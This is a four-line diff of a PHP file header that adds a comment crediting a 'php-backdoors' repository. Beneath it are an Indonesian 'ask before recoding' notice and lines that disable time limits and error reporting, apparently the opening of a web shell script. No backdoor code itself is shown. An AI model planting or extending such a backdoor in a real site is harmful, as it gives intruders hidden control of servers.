@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 /* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
 set_time_limit(0);
 error_reporting(0);
